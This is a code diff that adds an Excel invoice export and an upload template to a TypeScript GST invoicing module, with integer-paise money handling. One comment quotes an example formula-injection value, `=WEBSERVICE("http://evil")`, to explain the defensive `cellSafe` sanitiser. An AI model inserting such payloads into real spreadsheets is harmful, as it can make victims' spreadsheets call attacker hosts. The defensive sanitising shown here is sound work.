@@ -18,6 +18,10 @@
  * Money: all amounts in integer paise (BigInt).
  */
 
+import * as XLSX from 'xlsx';
+import { paiseToRupees } from '../common/money';
+import { buildXlsx } from '../common/xlsx';
+
 // ── Recipient constant (the self-bill buyer) ────────────────────────────────
 
 export const TECH_GIFSY = {
@@ -137,4 +141,184 @@ export function computeGST(
       totalPaise: basePaise + igstPaise,
     };
   }
+}
+
+// ── Excel round-trip (#44) ────────────────────────────────────────────────────
+
+/**
+ * A minimal AutoInvoice projection the export needs. We avoid importing the
+ * Prisma type so the helper stays a pure, framework-free unit.
+ *
+ * Money fields are paise — `bigint` when read straight from Prisma, but `number`
+ * after the JSON envelope round-trips. The export accepts either and divides by
+ * 100 exactly once at the display edge (via `paiseToRupees`).
+ */
+export interface InvoiceExportRow {
+  invoiceNumber: string;
+  invoiceNumberEdited?: boolean;
+  outletCode: string;
+  period: string;
+  invoiceDate: Date | string;
+  status: string;
+  subtotalPaise: bigint | number;
+  gstPaise: bigint | number;
+  gstType: GstType | null;
+  totalPaise: bigint | number;
+  /** Frozen-at-generation snapshot (typed loosely — it is stored as JSON). */
+  snapshot?: Record<string, unknown> | null;
+}
+
+/**
+ * Neutralise spreadsheet formula injection. A cell value that begins with
+ * `= + - @` (or a leading tab/CR) is interpreted as a live formula by Excel /
+ * Google Sheets — a partner-supplied firm name like `=WEBSERVICE("http://evil")`
+ * would execute when finance opens the export. Prefix such values with an
+ * apostrophe so they are always treated as text.
+ */
+function cellSafe(v: string): string {
+  return /^[=+\-@\t\r]/.test(v) ? `'${v}` : v;
+}
+
+/** Safe string read from the (loosely-typed) snapshot blob (partner-supplied). */
+function snap(row: InvoiceExportRow, key: string): string {
+  const v = row.snapshot?.[key];
+  return v == null ? '' : cellSafe(String(v));
+}
+
+/**
+ * For a CGST_SGST invoice the combined gstPaise splits evenly into CGST + SGST.
+ * We halve with integer (BigInt) arithmetic and put any odd-paise remainder on
+ * CGST so CGST + SGST === gstPaise exactly (never a rounding leak).
+ */
+function splitGst(gstPaise: bigint): { cgst: bigint; sgst: bigint } {
+  const sgst = gstPaise / 2n; // floor
+  const cgst = gstPaise - sgst; // carries the odd paise
+  return { cgst, sgst };
+}
+
+/** Two-decimal ₹ string from paise (display edge — divide by 100 exactly once). */
+function rupeeStr(paise: bigint | number): string {
+  return paiseToRupees(paise).toFixed(2);
+}
+
+/**
+ * Build the invoice export workbook (#44).
+ *
+ * One "Invoices" detail sheet (one row per invoice, ₹ with GST columns + the
+ * CGST/SGST split) plus a "Summary" totals sheet. All money is rendered ₹ at the
+ * display edge; the DB/transport values stay integer paise.
+ *
+ * Columns: S.No · Invoice Number · Outlet Code · Outlet Name · Firm Name · PAN
+ *          · State · GSTIN · Period · Invoice Date · Subtotal (₹) · GST Type
+ *          · CGST (₹) · SGST (₹) · IGST (₹) · Total GST (₹) · Total (₹) · Status
+ */
+export function buildInvoiceExportXlsx(
+  rows: InvoiceExportRow[],
+  periodLabelForFile?: string,
+): { buffer: Buffer; filename: string } {
+  const detail = rows.map((r, i) => {
+    const gstPaise = BigInt(r.gstPaise);
+    const isCgstSgst = r.gstType === 'CGST_SGST';
+    const { cgst, sgst } = isCgstSgst
+      ? splitGst(gstPaise)
+      : { cgst: 0n, sgst: 0n };
+    const igst = r.gstType === 'IGST' ? gstPaise : 0n;
+
+    const invoiceDate =
+      r.invoiceDate instanceof Date
+        ? r.invoiceDate.toISOString().slice(0, 10)
+        : String(r.invoiceDate ?? '').slice(0, 10);
+
+    return {
+      'S.No': i + 1,
+      'Invoice Number': r.invoiceNumber,
+      'Outlet Code': r.outletCode,
+      'Outlet Name': snap(r, 'outletName'),
+      'Firm Name': snap(r, 'firmName'),
+      PAN: snap(r, 'panNumber'),
+      State: snap(r, 'retailerState'),
+      GSTIN: snap(r, 'retailerGstin'),
+      Period: r.period,
+      'Invoice Date': invoiceDate,
+      'Subtotal (₹)': rupeeStr(r.subtotalPaise),
+      'GST Type': r.gstType ?? 'NONE',
+      'CGST (₹)': rupeeStr(cgst),
+      'SGST (₹)': rupeeStr(sgst),
+      'IGST (₹)': rupeeStr(igst),
+      'Total GST (₹)': rupeeStr(gstPaise),
+      'Total (₹)': rupeeStr(r.totalPaise),
+      Status: r.status,
+    };
+  });
+
+  // Summary totals — sum in paise (BigInt), convert once for display.
+  const totalSubtotal = rows.reduce((s, r) => s + BigInt(r.subtotalPaise), 0n);
+  const totalGst = rows.reduce((s, r) => s + BigInt(r.gstPaise), 0n);
+  const totalTotal = rows.reduce((s, r) => s + BigInt(r.totalPaise), 0n);
+
+  const summary = [
+    { Field: 'Total Invoices', Value: rows.length },
+    { Field: 'Total Subtotal (₹)', Value: rupeeStr(totalSubtotal) },
+    { Field: 'Total GST (₹)', Value: rupeeStr(totalGst) },
+    { Field: 'Total Invoice Value (₹)', Value: rupeeStr(totalTotal) },
+  ];
+
+  const buffer = buildXlsx([
+    // json_to_sheet needs at least one row to emit headers; fall back to a
+    // header-only sheet when the filtered set is empty.
+    {
+      name: 'Invoices',
+      rows: detail.length ? detail : [emptyInvoiceHeaderRow()],
+    },
+    { name: 'Summary', rows: summary },
+  ]);
+
+  const stamp = (periodLabelForFile ?? 'all').replace(/[^A-Za-z0-9-]/g, '');
+  const filename = `visibility-invoices-${stamp}-${Date.now()}.xlsx`;
+  return { buffer, filename };
+}
+
+/** Header-only placeholder row so an empty export still ships labelled columns. */
+function emptyInvoiceHeaderRow(): Record<string, string> {
+  return {
+    'S.No': '',
+    'Invoice Number': '',
+    'Outlet Code': '',
+    'Outlet Name': '',
+    'Firm Name': '',
+    PAN: '',
+    State: '',
+    GSTIN: '',
+    Period: '',
+    'Invoice Date': '',
+    'Subtotal (₹)': '',
+    'GST Type': '',
+    'CGST (₹)': '',
+    'SGST (₹)': '',
+    'IGST (₹)': '',
+    'Total GST (₹)': '',
+    'Total (₹)': '',
+    Status: '',
+  };
+}
+
+/**
+ * Build the blank upload template for the invoice-upload page (#44 — replaces the
+ * dead "Download sample template" link).
+ *
+ * The upload page drives the per-period generation flow (invoices are sourced
+ * from approved visibility payout entries — `CreditPayoutEntry`, the P6 no-compute
+ * model — NOT from arbitrary amounts). The template documents the period a run
+ * targets plus a reference outlet column so operators see the expected shape.
+ *
+ * Columns: Period (YYYY-MM) · Outlet Code (optional, reference)
+ */
+export function buildInvoiceUploadTemplate(): Buffer {
+  const wb = XLSX.utils.book_new();
+  const ws = XLSX.utils.aoa_to_sheet([
+    ['Period (YYYY-MM)', 'Outlet Code (optional)'],
+    ['2025-01', ''],
+  ]);
+  XLSX.utils.book_append_sheet(wb, ws, 'Invoice Periods');
+  return XLSX.write(wb, { type: 'buffer', bookType: 'xlsx' }) as Buffer;
 }
